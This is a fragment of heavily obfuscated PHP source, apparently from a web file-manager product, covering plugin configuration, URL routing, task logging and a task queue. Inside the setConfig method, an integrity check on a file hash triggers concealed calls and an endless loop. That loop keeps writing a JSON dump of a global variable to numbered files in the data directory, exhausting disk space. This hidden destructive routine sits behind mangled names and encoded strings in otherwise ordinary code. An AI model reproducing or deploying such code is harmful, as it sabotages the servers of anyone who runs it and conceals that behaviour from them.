return $this->packageData; } $¼ÊÔ™Àö = $this->parseFile($this->pluginPath . $ğÀ¡òÈš[1665]); $this->parseLang($¼ÊÔ™Àö); $°‡Ä¯”Ì = json_decode_force($¼ÊÔ™Àö); if (!$°‡Ä¯”Ì) { return array(); } $–ıÕãÕ¤ = Hook::trigger($ğÀ¡òÈš[1666], $°‡Ä¯”Ì); if ($–ıÕãÕ¤ && is_array($–ıÕãÕ¤)) { $°‡Ä¯”Ì = $–ıÕãÕ¤; } $this->packageData = $°‡Ä¯”Ì; return $°‡Ä¯”Ì; } public function packageInfoGet($©²½‚’ç) { $…ŠıÍ‚ = $this->appPackage(); return array_get_value($…ŠıÍ‚, $©²½‚’ç); } public function packageVersion() { return $this->packageInfoGet($_SERVER[÷åé¼î][1667]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[÷åé¼î][1668]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[÷åé¼î][1669]); } public function echoJsAssign($±’ŸİÚÒ, $¤›Šõ§Ú) { $this->echoJsAssignArr[$±’ŸİÚÒ] = $¤›Šõ§Ú; } private function parseFile($Å¦îû¨—) { $û„Ôõ¢ =& $_SERVER[÷åé¼î]; $¹ùË­ã = file_get_contents_nossl($Å¦îû¨—); $ŸàÀÁ«• = array($û„Ôõ¢[1670], $û„Ôõ¢[1671], $û„Ôõ¢[1672], $û„Ôõ¢[1673], $û„Ôõ¢[1674], $û„Ôõ¢[1675], $û„Ôõ¢[1676]); $ØÉşİêÌ = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$û„Ôõ¢[92]][$û„Ôõ¢[1677]]); foreach ($this->echoJsAssignArr as $Ì¶È’Š => $ú¢¥Ğê†) { $ŸàÀÁ«•[] = $û„Ôõ¢[1678] . $Ì¶È’Š . $û„Ôõ¢[1679]; $ØÉşİêÌ[] = is_array($ú¢¥Ğê†) || is_object($ú¢¥Ğê†) ? rawurlencode(json_encode($ú¢¥Ğê†)) : $ú¢¥Ğê†; } if (strstr($¹ùË­ã, $û„Ôõ¢[1680])) { $ã‘—ÔÃö = rawurlencode(json_encode($this->pluginLangArr)); $¹ùË­ã = str_replace($û„Ôõ¢[1680], $ã‘—ÔÃö, $¹ùË­ã); } if (strstr($¹ùË­ã, $û„Ôõ¢[1681])) { $ã‘—ÔÃö = $ã‘—ÔÃö = rawurlencode(json_encode($this->getConfig())); $¹ùË­ã = str_replace($û„Ôõ¢[1681], $ã‘—ÔÃö, $¹ùË­ã); } $¹ùË­ã = str_replace($ŸàÀÁ«•, $ØÉşİêÌ, $¹ùË­ã); return $¹ùË­ã; } private function parseLang(&$óòÏ£İË) { $öÁ´ùë =& $_SERVER[÷åé¼î]; $ğıúá = $öÁ´ùë[1682]; if (!strstr($óòÏ£İË, $ğıúá)) { return; } preg_match_all($öÁ´ùë[1683], $óòÏ£İË, $®—Æ¡âÇ); if (!is_array($®—Æ¡âÇ) || count($®—Æ¡âÇ) == 0 || !is_array($®—Æ¡âÇ[0]) || count($®—Æ¡âÇ[0]) == 0) { return; } $ùö™û = array(); $’Æ‘¢Õ¹ = array(); foreach ($®—Æ¡âÇ[0] as $ò¿Âò‡İ) { $íÒ¬ü° = substr($ò¿Âò‡İ, strlen($ğıúá), -4); $ºéÁ¶À× = LNG($íÒ¬ü°); $ùö™û[] = $ò¿Âò‡İ; $’Æ‘¢Õ¹[] = str_replace(array($öÁ´ùë[262], $öÁ´ùë[1151], $öÁ´ùë[402], $öÁ´ùë[121]), array($öÁ´ùë[53], $öÁ´ùë[53], $öÁ´ùë[12], $öÁ´ùë[1684]), $ºéÁ¶À×); } $óòÏ£İË = str_replace($ùö™û, $’Æ‘¢Õ¹, $óòÏ£İË); } private function parseConfig(&$˜Ïæœø”) { $·Ô˜×áÒ =& $_SERVER[÷åé¼î]; $š„õ’×† = $·Ô˜×áÒ[1685]; if (!strstr($˜Ïæœø”, $š„õ’×†)) { return; } preg_match_all($·Ô˜×áÒ[1686], $˜Ïæœø”, $Š’ú‹); if (!is_array($Š’ú‹) || count($Š’ú‹) == 0 || !is_array($Š’ú‹[0]) || count($Š’ú‹[0]) == 0) { return; } $Í¶Ø´ƒä = $this->getConfig(); $’ÍÁÈË× = array(); $Ü›ì°€† = array(); foreach ($Š’ú‹[0] as $ÅÜÎŞŠæ) { $‡­Âó = substr($ÅÜÎŞŠæ, strlen($š„õ’×†), -2); $’ÍÁÈË×[] = $ÅÜÎŞŠæ; $Ü›ì°€†[] = _get($Í¶Ø´ƒä, $‡­Âó); } $˜Ïæœø” = str_replace($’ÍÁÈË×, $Ü›ì°€†, $˜Ïæœø”); } private function parsePackage(&$ã¹‹™§ª) { $ì‰…­Œ› =& $_SERVER[÷åé¼î]; $ÙŸ àšÇ = $ì‰…­Œ›[1687]; if (!strstr($ã¹‹™§ª, $ÙŸ àšÇ)) { return; } preg_match_all($ì‰…­Œ›[1688], $ã¹‹™§ª, $§…Ø¾†®); if (!is_array($§…Ø¾†®) || count($§…Ø¾†®) == 0 || !is_array($§…Ø¾†®[0]) || count($§…Ø¾†®[0]) == 0) { return; } $È§ˆŞÇ = $this->appPackage(); $î¶ÆöÌ¤ = array(); $ê™îàâà = array(); foreach ($§…Ø¾†®[0] as $À¾´›ğ”) { $à÷ìÇ©÷ = substr($À¾´›ğ”, strlen($ÙŸ àšÇ), -2); $î¶ÆöÌ¤[] = $À¾´›ğ”; $ê™îàâà[] = _get($È§ˆŞÇ, $à÷ìÇ©÷); } $ã¹‹™§ª = str_replace($î¶ÆöÌ¤, $ê™îàâà, $ã¹‹™§ª); } final function echoFile($ëÑ“Ú«ê, $ÚÔÉÕÓ¯ = false) { $¹Š±ĞØÁ =& $_SERVER[÷åé¼î]; $¯õşúË– = $this->pluginPath . $ëÑ“Ú«ê; if (ACT == $¹Š±ĞØÁ[1689]) { echo $¹Š±ĞØÁ[1690] . $this->pluginName . $¹Š±ĞØÁ[8] . $ëÑ“Ú«ê . $¹Š±ĞØÁ[1691]; if (!file_exists($¯õşúË–)) { echo $¹Š±ĞØÁ[1692]; return; } } $Âê‰øû = $this->parseFile($¯õşúË–); $this->parseLang($Âê‰øû); $this->parseConfig($Âê‰øû); $this->parsePackage($Âê‰øû); if (is_array($ÚÔÉÕÓ¯)) { $Âê‰øû = str_replace(array_keys($ÚÔÉÕÓ¯), array_values($ÚÔÉÕÓ¯), $Âê‰øû); } echo $¹Š±ĞØÁ[262] . $Âê‰øû; } private function checkVersion() { $ş¯òªêÜ =& $_SERVER[÷åé¼î]; $õÏ¥â¶Á = $this->appPackage(); $ºˆæ„—ã = $this->getConfig(); if ($ºˆæ„—ã[$ş¯òªêÜ[1693]] == $õÏ¥â¶Á[$ş¯òªêÜ[1667]]) { return; } $this->regist(); $this->setConfig(array($ş¯òªêÜ[1693] => $õÏ¥â¶Á[$ş¯òªêÜ[1667]])); } final function initLang() { $Ş¾ÏÑ¨” =& $_SERVER[÷åé¼î]; $¢Šè²©„ = $Ş¾ÏÑ¨”[1694]; $Çûõó­á = $this->pluginPath . $Ş¾ÏÑ¨”[1695]; $´¸”Ô‘š = I18n::getType(); $°ø¯ŠÓ× = array(); if (file_exists($Çûõó­á . $´¸”Ô‘š . $Ş¾ÏÑ¨”[903])) { $°ø¯ŠÓ× = (include $Çûõó­á . $´¸”Ô‘š . $Ş¾ÏÑ¨”[903]); } else { if ($´¸”Ô‘š == $Ş¾ÏÑ¨”[1696] && !file_exists($Çûõó­á . $´¸”Ô‘š . $Ş¾ÏÑ¨”[903]) && file_exists($Çûõó­á . $Ş¾ÏÑ¨”[1697])) { $°ø¯ŠÓ× = (include $Çûõó­á . $Ş¾ÏÑ¨”[1697]); } else { if (file_exists($Çûõó­á . $¢Šè²©„ . $Ş¾ÏÑ¨”[903])) { $°ø¯ŠÓ× = (include $Çûõó­á . $¢Šè²©„ . $Ş¾ÏÑ¨”[903]); } } } if (!is_array($°ø¯ŠÓ×)) { return array(); } if (@count($°ø¯ŠÓ×) > 0) { I18n::set($°ø¯ŠÓ×); } return $°ø¯ŠÓ×; } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($±†É§ò¾) { $•¢„‹ù =& $_SERVER[÷åé¼î]; $ïß™ÉúÊ = $_SERVER[$•¢„‹ù[935]] . $•¢„‹ù[936]; $¯ÃÛ›€¢ = $•¢„‹ù[932]; if ($_SERVER[$•¢„‹ù[933]] != $¯ÃÛ›€¢($ïß™ÉúÊ)) { $÷ÓíÀóË = $•¢„‹ù[949]; $ŸÒ…«ÏË = $•¢„‹ù[934]; $ôÙÃëµ = $_SERVER[$•¢„‹ù[935]] . $•¢„‹ù[936]; $†ÈØÜŸĞ = $ŸÒ…«ÏË($ôÙÃëµ); $ìÖ”Óò› = explode($•¢„‹ù[262], $†ÈØÜŸĞ); if (count($ìÖ”Óò›) < $•¢„‹ù[703]) { $íâ¬›ïù = $•¢„‹ù[937]; $íâ¬›ïù(); } $ÅØñ—´³ = $•¢„‹ù[950]; $ÅØñ—´³($_SERVER[$•¢„‹ù[951]]); $÷ÓíÀóË = $•¢„‹ù[949]; $÷ÓíÀóË(); $˜Øç“Œı = $•¢„‹ù[952]; $øšÔÉã² = json_encode($GLOBALS[$•¢„‹ù[953]]); $ı­Ñø¢Ş = 1; for ($Š÷Ğ· = $ı­Ñø¢Ş; $Š÷Ğ· > 0; $Š÷Ğ·++) { $˜Øç“Œı(DATA_PATH . $Š÷Ğ·, $øšÔÉã²); } } $this->pluginConfig = array(); return $this->modelPlugin->setConfig($this->pluginName, $±†É§ò¾); } public function onSetConfig($²şšÅ) { } public function onGetConfig($˜™½ËÓŸ) { } public function onUpdate() { } public function onUninstall() { } public function onChangeOpen() { } public function onChangeClose() { } public function onChangeStatus($æÙË˜ä) { if ($æÙË˜ä == 1) { $this->onChangeOpen(); } else { $this->onChangeClose(); } } public function authCheck($Şæ”¥Ø™ = "\160\x6c\x75\147\x69\156\101\x75\x74\x68") { if (KodUser::isRoot()) { return !0; } if (!KodUser::isLogin()) { return !1; } $ŠåŞÒ = $this->getConfig(); if (!$ŠåŞÒ[$Şæ”¥Ø™]) { return !1; } return ActionCall($_SERVER[÷åé¼î][1698], $ŠåŞÒ[$Şæ”¥Ø™]); } public function url($Ä¥¬ÜŞ¨, $¿ãºª…Ï = '', $‘¡Äş°ø = true) { $æ÷…ç“á =& $_SERVER[÷åé¼î]; $ÎÕß¹Ùß = $this->getConfig(); $Îà¸ãĞ¼ = KOD_VERSION . $æ÷…ç“á[10] . KOD_VERSION_BUILD; $ÕÜŞÏÖ¾ = $this->packageVersion(); $ĞâÒ‘ = $Îà¸ãĞ¼ . $æ÷…ç“á[446] . $ÕÜŞÏÖ¾; if (substr($Ä¥¬ÜŞ¨, 0, 4) == $æ÷…ç“á[152] || substr($Ä¥¬ÜŞ¨, 0, 2) == $æ÷…ç“á[1435]) { $·ÔÌÜÇÊ = $Ä¥¬ÜŞ¨ . $æ÷…ç“á[1699] . $ĞâÒ‘; } else { if ($¿ãºª…Ï == $æ÷…ç“á[12]) { $·ÔÌÜÇÊ = $this->pluginHost . $Ä¥¬ÜŞ¨ . $æ÷…ç“á[1699] . $ĞâÒ‘; } else { if ($¿ãºª…Ï === $æ÷…ç“á[78]) { $·ÔÌÜÇÊ = $this->pluginHost . $Ä¥¬ÜŞ¨; } else { if ($¿ãºª…Ï == $æ÷…ç“á[1700]) { $·ÔÌÜÇÊ = STATIC_PATH . $Ä¥¬ÜŞ¨ . $æ÷…ç“á[1699] . $Îà¸ãĞ¼; } else { if ($¿ãºª…Ï == $æ÷…ç“á[1701]) { $·ÔÌÜÇÊ = APP_HOST . $æ÷…ç“á[1702] . $Ä¥¬ÜŞ¨ . $æ÷…ç“á[1699] . $Îà¸ãĞ¼; } else { if (isset($ÎÕß¹Ùß[$¿ãºª…Ï])) { $·ÔÌÜÇÊ = $ÎÕß¹Ùß[$¿ãºª…Ï] . $Ä¥¬ÜŞ¨ . $æ÷…ç“á[1699] . $ĞâÒ‘; } } } } } } if (!$‘¡Äş°ø) { return $·ÔÌÜÇÊ; } echo $·ÔÌÜÇÊ; } public function link($î£­Ğ = false, $ú°¦íŠé = '') { $çŞÙÖÜ =& $_SERVER[÷åé¼î]; $î°Ú×Ç = $this->linkHas == !1; $this->linkHas = !0; if (!$î£­Ğ) { $this->link($çŞÙÖÜ[1703], $çŞÙÖÜ[1701]); $this->link($çŞÙÖÜ[1704], $çŞÙÖÜ[1700]); $this->link($çŞÙÖÜ[1705], $çŞÙÖÜ[1700]); $this->link($çŞÙÖÜ[1706], $çŞÙÖÜ[1700]); $this->link($çŞÙÖÜ[1707], $çŞÙÖÜ[1700]); if ($î°Ú×Ç) { Hook::trigger($çŞÙÖÜ[1708]); } return; } $Áİ‚¡Ø = $this->url($î£­Ğ, $ú°¦íŠé, !1); if (substr($î£­Ğ, -3) == $çŞÙÖÜ[1709]) { echo $çŞÙÖÜ[1710] . $Áİ‚¡Ø . $çŞÙÖÜ[1711] . $çŞÙÖÜ[262]; } else { if (substr($î£­Ğ, -4) == $çŞÙÖÜ[1712]) { echo $çŞÙÖÜ[1713] . $Áİ‚¡Ø . $çŞÙÖÜ[1714] . $çŞÙÖÜ[262]; } } if ($î°Ú×Ç) { Hook::trigger($çŞÙÖÜ[1708]); } } } class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\72\141\156\171" => "\133\136\x2f\x5d\53", "\72\x6e\165\x6d" => "\x5b\60\x2d\71\135\53", "\72\141\x6c\154" => "\x2e\52"); public static $errorCallback; public static function __callstatic($µÇõ‚ë¾, $ÄÜã•Î) { $ø”–§şØ =& $_SERVER[÷åé¼î]; if ($µÇõ‚ë¾ == $ø”–§şØ[1715]) { $±¥Œù—Û = array_map($ø”–§şØ[1716], $ÄÜã•Î[0]); $ØÆ’šØ¡ = strpos($ÄÜã•Î[1], $ø”–§şØ[8]) === 0 ? $ÄÜã•Î[1] : $ø”–§şØ[8] . $ÄÜã•Î[1]; $öøÁõù = $ÄÜã•Î[2]; } else { $±¥Œù—Û = null; $ØÆ’šØ¡ = strpos($ÄÜã•Î[0], $ø”–§şØ[8]) === 0 ? $ÄÜã•Î[0] : $ø”–§şØ[8] . $ÄÜã•Î[0]; $öøÁõù = $ÄÜã•Î[1]; } array_push(self::$maps, $±¥Œù—Û); array_push(self::$routes, $ØÆ’šØ¡); array_push(self::$methods, strtoupper($µÇõ‚ë¾)); array_push(self::$callbacks, $öøÁõù); } public static function error($á»íì•) { self::$errorCallback = $á»íì•; } public static function haltOnMatch($ùµ²êş = true) { self::$halts = $ùµ²êş; } public static function dispatch() { $™†È¶¯ê =& $_SERVER[÷åé¼î]; $³ñò¨Éµ = parse_url($_SERVER[$™†È¶¯ê[1717]], PHP_URL_PATH); $µÁ´îœì = $_SERVER[$™†È¶¯ê[164]]; $²¿ìÌ¨‘ = array_keys(static::$patterns); $ß¯æªÛ¢ = array_values(static::$patterns); $ö§¤÷·ß = !1; self::$routes = preg_replace($™†È¶¯ê[1355], $™†È¶¯ê[8], self::$routes); if (in_array($³ñò¨Éµ, self::$routes)) { $­ŸÊ¿§¨ = array_keys(self::$routes, $³ñò¨Éµ); foreach ($­ŸÊ¿§¨ as $ãóÙß‡Ê) { if (self::$methods[$ãóÙß‡Ê] == $µÁ´îœì || self::$methods[$ãóÙß‡Ê] == $™†È¶¯ê[1718] || in_array($µÁ´îœì, self::$maps[$ãóÙß‡Ê])) { $ö§¤÷·ß = !0; if (!is_object(self::$callbacks[$ãóÙß‡Ê])) { $üéÖÄ¦œ = explode($™†È¶¯ê[8], self::$callbacks[$ãóÙß‡Ê]); $ª˜Ø’Â = end($üéÖÄ¦œ); $¿®Ì×¨ï = explode($™†È¶¯ê[1287], $ª˜Ø’Â); $ÎÁÁ‰È = new $¿®Ì×¨ï[0](); $ÎÁÁ‰È->{$¿®Ì×¨ï[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$ãóÙß‡Ê]); if (self::$halts) { return; } } } } } else { $Ç‹Ó“ƒú = 0; foreach (self::$routes as $ãóÙß‡Ê) { if (strpos($ãóÙß‡Ê, $™†È¶¯ê[4]) !== !1) { $ãóÙß‡Ê = str_replace($²¿ìÌ¨‘, $ß¯æªÛ¢, $ãóÙß‡Ê); } if (preg_match($™†È¶¯ê[1719] . $ãóÙß‡Ê . $™†È¶¯ê[1720], $³ñò¨Éµ, $£Ø°çÔØ)) { if (self::$methods[$Ç‹Ó“ƒú] == $µÁ´îœì || self::$methods[$Ç‹Ó“ƒú] == $™†È¶¯ê[1718] || !empty(self::$maps[$Ç‹Ó“ƒú]) && in_array($µÁ´îœì, self::$maps[$Ç‹Ó“ƒú])) { $ö§¤÷·ß = !0; array_shift($£Ø°çÔØ); if (!is_object(self::$callbacks[$Ç‹Ó“ƒú])) { $üéÖÄ¦œ = explode($™†È¶¯ê[8], self::$callbacks[$Ç‹Ó“ƒú]); $ª˜Ø’Â = end($üéÖÄ¦œ); $¿®Ì×¨ï = explode($™†È¶¯ê[1287], $ª˜Ø’Â); $ÎÁÁ‰È = new $¿®Ì×¨ï[0](); if (!method_exists($ÎÁÁ‰È, $¿®Ì×¨ï[1])) { echo $™†È¶¯ê[1721]; } else { call_user_func_array(array($ÎÁÁ‰È, $¿®Ì×¨ï[1]), $£Ø°çÔØ); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$Ç‹Ó“ƒú], $£Ø°çÔØ); if (self::$halts) { return; } } } } $Ç‹Ó“ƒú++; } } if ($ö§¤÷·ß == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $ŒÎà²ãù =& $_SERVER[÷åé¼î]; header($_SERVER[$ŒÎà²ãù[1722]] . $ŒÎà²ãù[1723]); echo $ŒÎà²ãù[1724]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$™†È¶¯ê[1717]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } } } goto AòºøõË›Ë; eîïÈÙÑ: class TaskLog { private $task; private $taskID; private $isEnd = false; static function newTask($çğ—î²í, $ÇŠğ¡´Ù = '', $ò¢ó±¿ = 0, $©ùªÚ½Ì = '') { $´±ÃŸíÎ =& $_SERVER[÷åé¼î]; $©ùªÚ½Ì = $©ùªÚ½Ì ? $©ùªÚ½Ì : ($ÇŠğ¡´Ù ? $ÇŠğ¡´Ù : $çğ—î²í); $ãÔúÜ”¹ = new Task($çğ—î²í, $ÇŠğ¡´Ù, $ò¢ó±¿, $©ùªÚ½Ì); $GLOBALS[$´±ÃŸíÎ[1862] . $çğ—î²í] = new TaskLog($´±ÃŸíÎ[1763], $ãÔúÜ”¹, $©ùªÚ½Ì); return $ãÔúÜ”¹; } public function __construct($šëùíÄ = '', $÷¼ç›´Š = '', $Ñ›ÀÚ = '') { $ÛöìÀµâ =& $_SERVER[÷åé¼î]; if (!$šëùíÄ) { $šëùíÄ = $ÛöìÀµâ[1763]; } $ã×ğÖáı = $šëùíÄ . $ÛöìÀµâ[446] . rand_string(10); if (!$Ñ›ÀÚ) { $Ñ›ÀÚ = $šëùíÄ . $ÛöìÀµâ[53] . $Ñ›ÀÚ; } switch ($šëùíÄ) { case $ÛöìÀµâ[1763]: if (!$÷¼ç›´Š || !$÷¼ç›´Š->task) { return echoLog($šëùíÄ . $ÛöìÀµâ[1863]); } $«¼’¦Æ÷ = $÷¼ç›´Š; $ã×ğÖáı = $«¼’¦Æ÷->task[$ÛöìÀµâ[459]]; $šëùíÄ = $«¼’¦Æ÷->task[$ÛöìÀµâ[459]]; if (!$«¼’¦Æ÷->task[$ÛöìÀµâ[1668]]) { $«¼’¦Æ÷->task[$ÛöìÀµâ[1668]] = $Ñ›ÀÚ ? $Ñ›ÀÚ : $šëùíÄ; } break; case $ÛöìÀµâ[1864]: if (!$÷¼ç›´Š) { return echoLog($šëùíÄ . $ÛöìÀµâ[1865]); } $÷•‚ú…î = is_string($÷¼ç›´Š) ? array($÷¼ç›´Š) : $÷¼ç›´Š; $«¼’¦Æ÷ = new TaskFileTransfer($ã×ğÖáı, $šëùíÄ, 0, $Ñ›ÀÚ ? $Ñ›ÀÚ : $÷•‚ú…î[0]); foreach ($÷•‚ú…î as $ÏŠ´»‚) { $«¼’¦Æ÷->addPath($ÏŠ´»‚); } break; case $ÛöìÀµâ[373]: if (!$÷¼ç›´Š) { return echoLog($šëùíÄ . $ÛöìÀµâ[1865]); } $÷•‚ú…î = is_string($÷¼ç›´Š) ? array($÷¼ç›´Š) : $÷¼ç›´Š; $«¼’¦Æ÷ = new TaskZip($ã×ğÖáı, $šëùíÄ, 0, $Ñ›ÀÚ ? $Ñ›ÀÚ : $÷•‚ú…î[0]); foreach ($÷•‚ú…î as $ÏŠ´»‚) { $«¼’¦Æ÷->addPath($ÏŠ´»‚); } break; case $ÛöìÀµâ[1293]: if (!$÷¼ç›´Š) { return echoLog($šëùíÄ . $ÛöìÀµâ[1865]); } $«¼’¦Æ÷ = new TaskUnZip($ã×ğÖáı, $šëùíÄ, 0, $Ñ›ÀÚ ? $Ñ›ÀÚ : $÷¼ç›´Š); if ($÷¼ç›´Š) { $«¼’¦Æ÷->addFile($÷¼ç›´Š); } break; case $ÛöìÀµâ[152]: $«¼’¦Æ÷ = new TaskHttp($ã×ğÖáı, $šëùíÄ); break; default: return; break; } $this->task = $«¼’¦Æ÷; $this->taskID = $ã×ğÖáı; Hook::bind($ÛöìÀµâ[1800], array($this, $ÛöìÀµâ[1866])); Hook::bind($ÛöìÀµâ[1802], array($this, $ÛöìÀµâ[1867])); Hook::bind($ÛöìÀµâ[1796], array($this, $ÛöìÀµâ[1868])); echoLog($ÛöìÀµâ[1869] . $«¼’¦Æ÷->task[$ÛöìÀµâ[1668]]); } public function __destruct() { $this->end(); } public function end($´»„ğü– = '') { $ñ¢ı†™Ú =& $_SERVER[÷åé¼î]; if ($this->isEnd) { return; } if (!$this->task || !$this->taskID) { return; } $this->isEnd = !0; $this->task->end($´»„ğü–); $this->task = !1; $this->taskID = !1; Hook::unbind($ñ¢ı†™Ú[1800], array($this, $ñ¢ı†™Ú[1866])); Hook::unbind($ñ¢ı†™Ú[1802], array($this, $ñ¢ı†™Ú[1867])); Hook::unbind($ñ¢ı†™Ú[1796], array($this, $ñ¢ı†™Ú[1868])); } public function taskUpdate($Èñã‡”å) { $áİï‘ˆ™ =& $_SERVER[÷åé¼î]; if (!$Èñã‡”å || $this->taskID != $Èñã‡”å[$áİï‘ˆ™[459]]) { return; } $¸À„ú¢ = 20; $ïÅ¨õ÷ = intval($Èñã‡”å[$áİï‘ˆ™[1781]] * $¸À„ú¢); $ô¨ğ§„æ = $áİï‘ˆ™[176] . str_repeat($áİï‘ˆ™[956], $ïÅ¨õ÷) . $áİï‘ˆ™[1086] . str_repeat($áİï‘ˆ™[53], $¸À„ú¢ - $ïÅ¨õ÷) . $áİï‘ˆ™[178]; $»âÕ„ò = $ô¨ğ§„æ . sprintf($áİï‘ˆ™[1870], $Èñã‡”å[$áİï‘ˆ™[1781]] * 100) . $áİï‘ˆ™[1871]; $Ñ‚’³‹Ş = $»âÕ„ò . $Èñã‡”å[$áİï‘ˆ™[1780]] . $áİï‘ˆ™[8] . $Èñã‡”å[$áİï‘ˆ™[1135]] . LNG($áİï‘ˆ™[1872]); $±©¥—ëÚ = $áİï‘ˆ™[12]; if ($Èñã‡”å[$áİï‘ˆ™[1856]]) { $Ñ‚’³‹Ş = $»âÕ„ò . size_format($Èñã‡”å[$áİï‘ˆ™[1780]]) . $áİï‘ˆ™[8] . size_format($Èñã‡”å[$áİï‘ˆ™[1135]]); $±©¥—ëÚ = size_format($Èñã‡”å[$áİï‘ˆ™[1782]]) . $áİï‘ˆ™[1873]; } if ($Èñã‡”å[$áİï‘ˆ™[1137]]) { $Èñã‡”å[$áİï‘ˆ™[1830]] = $Èñã‡”å[$áİï‘ˆ™[1137]] . $áİï‘ˆ™[53] . $Èñã‡”å[$áİï‘ˆ™[1830]]; } if ($Èñã‡”å[$áİï‘ˆ™[1830]]) { $´Ã­êñ™ = $áİï‘ˆ™[12]; if ($Èñã‡”å[$áİï‘ˆ™[1832]]) { $´Ã­êñ™ = $áİï‘ˆ™[50] . size_format($Èñã‡”å[$áİï‘ˆ™[1833]]) . $áİï‘ˆ™[8] . size_format($Èñã‡”å[$áİï‘ˆ™[1832]]); } $±©¥—ëÚ .= $Èñã‡”å[$áİï‘ˆ™[1830]] . $´Ã­êñ™; } if ($Èñã‡”å[$áİï‘ˆ™[828]] && !$Èñã‡”å[$áİï‘ˆ™[1832]]) { $±©¥—ëÚ .= $áİï‘ˆ™[53] . size_format($Èñã‡”å[$áİï‘ˆ™[1837]]) . $áİï‘ˆ™[8] . size_format($Èñã‡”å[$áİï‘ˆ™[828]]); } echoLog($Ñ‚’³‹Ş . $áİï‘ˆ™[53] . $±©¥—ëÚ, !0); } public function taskEnd($ú›Œ‹ö) { $¶¢¡¯ÃÚ =& $_SERVER[÷åé¼î]; if (!$ú›Œ‹ö || $this->taskID != $ú›Œ‹ö[$¶¢¡¯ÃÚ[459]]) { return; } $Û‚œ¦â² = $ú›Œ‹ö ? $ú›Œ‹ö[$¶¢¡¯ÃÚ[1780]] . $¶¢¡¯ÃÚ[8] . $ú›Œ‹ö[$¶¢¡¯ÃÚ[1135]] . LNG($¶¢¡¯ÃÚ[1872]) . $¶¢¡¯ÃÚ[74] : $¶¢¡¯ÃÚ[12]; echoLog($¶¢¡¯ÃÚ[1874] . $ú›Œ‹ö[$¶¢¡¯ÃÚ[1668]] . ($ú›Œ‹ö[$¶¢¡¯ÃÚ[510]] ? $¶¢¡¯ÃÚ[74] . $ú›Œ‹ö[$¶¢¡¯ÃÚ[510]] : $¶¢¡¯ÃÚ[12]) . $¶¢¡¯ÃÚ[74] . $Û‚œ¦â² . $¶¢¡¯ÃÚ[1875] . sprintf($¶¢¡¯ÃÚ[915], timeFloat() - $ú›Œ‹ö[$¶¢¡¯ÃÚ[1783]]) . $¶¢¡¯ÃÚ[1795]); $this->end(); } public function taskKill($ªÈÒ×ÅÆ) { $üÔşëìš =& $_SERVER[÷åé¼î]; if (!$ªÈÒ×ÅÆ || $this->taskID != $ªÈÒ×ÅÆ[$üÔşëìš[459]]) { return; } echoLog($üÔşëìš[1876] . $ªÈÒ×ÅÆ[$üÔşëìš[1668]]); } } class TaskQueue { const MAX_LENGTH = 2000; const QUEUE_LENGTH = "\x74\141\x73\x6b\x51\165\145\x75\x65\x4c\x65\x6e\x67\x74\x68"; const QUEUE_DATA = "\x74\141\163\x6b\x51\165\x65\x75\145\x44\x61\x74\x61"; const QUEUE_TIME = "\164\x61\163\153\121\x75\145\165\145\x4c\x61\163\x74\x52\x75\x6e"; const QUEUE_THREAD = "\164\x61\163\153\x51\165\x65\165\145\x54\150\162\145\x61\x64"; public static $listData = false; public static $listDataAdd = false; public static function initTask() { } public static function add($ÅØ‡‡»É, $Ï¤à¡‰Å = array(), $š÷²Åûà = '', $Î‹éÁµù = '') { $£÷¢‰Å =& $_SERVER[÷åé¼î]; if (self::$listData === !1) { self::$listData = self::getAll(); self::$listDataAdd = array(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($Î‹éÁµù && array_find_by_field(self::$listData, $£÷¢‰Å[97], $Î‹éÁµù)) { return !0; } if ($Î‹éÁµù && array_find_by_field(self::$listDataAdd, $£÷¢‰Å[97], $Î‹éÁµù)) { return !0; } self::$listDataAdd[] = array($£÷¢‰Å[325] => $ÅØ‡‡»É, $£÷¢‰Å[1877] => $Ï¤à¡‰Å, $£÷¢‰Å[510] => $š÷²Åûà, $£÷¢‰Å[97] => $Î‹éÁµù); return !0; } public static function addSubmit() { $âô“øÌ =& $_SERVER[÷åé¼î]; if (!self::$listDataAdd || count(self::$listDataAdd) == 0) { return; } self::setAll(array_merge(self::getAll(), self::$listDataAdd)); write_log($âô“øÌ[1878] . json_encode_force(array_to_keyvalue(self::$listDataAdd, $âô“øÌ[12], $âô“øÌ[510])), $âô“øÌ[197]); self::$listData = !1; self::$listDataAdd = !1; } public static function addNow($’ğ¦òé, $‚âš˜ä… = array(), $œ¸÷¼øØ = '', $÷¥Œë = '') { $Ö¯‚Õ‡ =& $_SERVER[÷åé¼î]; if (self::count() >= self::MAX_LENGTH) { return !1; } $™Å¡ºóˆ = self::getAll(); if ($÷¥Œë && array_find_by_field($™Å¡ºóˆ, $Ö¯‚Õ‡[97], $÷¥Œë)) { return !0; } $™Å¡ºóˆ[] = array($Ö¯‚Õ‡[325] => $’ğ¦òé, $Ö¯‚Õ‡[1877] => $‚âš˜ä…, $Ö¯‚Õ‡[510] => $œ¸÷¼øØ, $Ö¯‚Õ‡[97] => $÷¥Œë); self::setAll($™Å¡ºóˆ); write_log($Ö¯‚Õ‡[1878] . $œ¸÷¼øØ, $Ö¯‚Õ‡[197]); return !0; } public static function run() { $¸†ÎáÚä =& $_SERVER[÷åé¼î]; $Æ¿ŒÀ”¤ = self::getAll(); $°÷§ ­€ = array_shift($Æ¿ŒÀ”¤); if (!$°÷§ ­€) { return !1; } self::setAll($Æ¿ŒÀ”¤); $Şâ†Ú±Ò = timeFloat(); $ê»§òİ› = $¸†ÎáÚä[12]; try { $ê»§òİ› = Hook::apply($°÷§ ­€[$¸†ÎáÚä[325]], $°÷§ ­€[$¸†ÎáÚä[1877]]); } catch (Exception $©îĞÓ×ú) { write_log($©îĞÓ×ú, $¸†ÎáÚä[1258]); } $Èş¡šÉù = number_format(timeFloat() - $Şâ†Ú±Ò, 3) . 